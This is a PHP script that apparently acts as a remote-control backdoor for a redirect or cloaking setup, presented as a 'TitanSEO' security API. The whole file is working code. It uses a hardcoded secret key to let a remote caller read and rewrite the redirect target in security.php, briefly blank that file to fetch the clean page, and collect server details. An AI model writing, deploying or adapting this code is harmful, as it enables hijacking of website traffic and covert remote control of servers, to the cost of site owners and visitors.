<?php
define('API_SECRET_KEY', 'TitanSEO_Security_API_2024_Key');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method not allowed');
}

$input = json_decode(file_get_contents('php://input'), true);
$secret = $input['secret_key'] ?? '';
$action = $input['action'] ?? '';

if ($secret !== API_SECRET_KEY) {
    http_response_code(403);
    exit(json_encode(['error' => 'Invalid secret key']));
}

$securityFile = __DIR__ . '/security.php';

switch ($action) {
    case 'read':
        if (!file_exists($securityFile)) {
            http_response_code(404);
            exit(json_encode(['error' => 'security.php not found']));
        }
        
        $content = file_get_contents($securityFile);
        
        $pattern1 = '/\$redirect_url\s*=\s*[\'"]([^\'"]+)[\'"];?/';
        $pattern2 = '/\$real_user_domain\s*=\s*[\'"]([^\'"]+)[\'"];?/';
        
        preg_match($pattern1, $content, $matches1);
        preg_match($pattern2, $content, $matches2);
        
        $currentUrl = $matches1[1] ?? $matches2[1] ?? '';
        
        echo json_encode([
            'success' => true,
            'content' => $content,
            'real_user_domain' => $currentUrl,
            'file_size' => filesize($securityFile),
            'last_modified' => date('Y-m-d H:i:s', filemtime($securityFile))
        ]);
        break;
        
    case 'get_page_content':
        try {
            $securityBackup = null;
            if (file_exists($securityFile)) {
                $securityBackup = file_get_contents($securityFile);
                $tempSecurity = "<?php\n// Временно отключено для API\n";
                file_put_contents($securityFile, $tempSecurity);
            }
            
            ob_start();
            $indexFile = __DIR__ . '/index.php';
            if (file_exists($indexFile)) {
                include $indexFile;
            } else {
                echo '<html><body><h1>Сайт работает</h1><p>Главная страница</p></body></html>';
            }
            $pageContent = ob_get_clean();
            
            if ($securityBackup !== null) {
                file_put_contents($securityFile, $securityBackup);
            }
            
            echo json_encode([
                'success' => true,
                'content' => $pageContent,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            
        } catch (Exception $e) {
            if ($securityBackup !== null) {
                file_put_contents($securityFile, $securityBackup);
            }
            
            echo json_encode([
                'success' => false,
                'error' => 'Failed to get page content: ' . $e->getMessage()
            ]);
        }
        break;
        
    case 'update_url':
        if (!file_exists($securityFile)) {
            http_response_code(404);
            exit(json_encode(['error' => 'security.php not found']));
        }
        
        $newUrl = $input['new_url'] ?? '';
        if (empty($newUrl)) {
            http_response_code(400);
            exit(json_encode(['error' => 'new_url is required']));
        }
        
        $content = file_get_contents($securityFile);
        
        // Создаем бэкап
        $backupFile = $securityFile . '.backup.' . date('Y-m-d_H-i-s');
        file_put_contents($backupFile, $content);
        
        $pattern1 = '/(\$redirect_url\s*=\s*[\'"])([^\'"]+)([\'"];?)/';
        $pattern2 = '/(\$real_user_domain\s*=\s*[\'"])([^\'"]+)([\'"];?)/';
        
        $replacement = '${1}' . $newUrl . '${3}';
        
        $newContent = preg_replace($pattern1, $replacement, $content);
        
        if ($newContent === $content) {
            $newContent = preg_replace($pattern2, $replacement, $content);
        }
        
        if ($newContent === null) {
            http_response_code(500);
            exit(json_encode(['error' => 'Failed to update URL']));
        }
        
        if (file_put_contents($securityFile, $newContent) === false) {
            http_response_code(500);
            exit(json_encode(['error' => 'Failed to write file']));
        }
        
        echo json_encode([
            'success' => true,
            'message' => 'URL updated successfully',
            'backup_file' => basename($backupFile),
            'old_url' => $input['old_url'] ?? '',
            'new_url' => $newUrl
        ]);
        break;
        
    case 'get_info':
        $info = [
            'domain' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
            'php_version' => PHP_VERSION,
            'security_file_exists' => file_exists($securityFile),
            'security_file_writable' => is_writable($securityFile),
            'api_file' => __FILE__,
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        if (file_exists($securityFile)) {
            $info['security_file_size'] = filesize($securityFile);
            $info['security_file_modified'] = date('Y-m-d H:i:s', filemtime($securityFile));
        }
        
        echo json_encode(['success' => true, 'info' => $info]);
        break;
        
    default:
        http_response_code(400);
        exit(json_encode(['error' => 'Invalid action']));
}
?> 